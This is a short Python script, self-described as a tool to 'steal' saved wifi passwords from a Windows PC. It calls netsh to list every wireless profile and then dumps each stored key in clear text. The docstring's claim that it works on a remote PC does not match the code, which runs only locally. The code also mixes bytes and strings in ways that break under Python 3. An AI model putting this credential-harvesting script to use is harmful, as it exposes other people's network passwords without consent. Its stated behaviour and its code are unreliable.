#!/usr/bin/python3
"""
win_wifi_steal.py - Windows wifi pass steal

With this script you can obtain the wifi pass from the remote Windows PC.
"""

import re
import subprocess

# Find the list of networks
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

# Initialize the output
output = ""

# Run the command for all the networks found
for network in networks_list:
    command = f"netsh wlan show profile {network} key=clear"
    result = subprocess.check_output(command, shell=True)
    output += result
    print(f"Password for {network} - {result}")
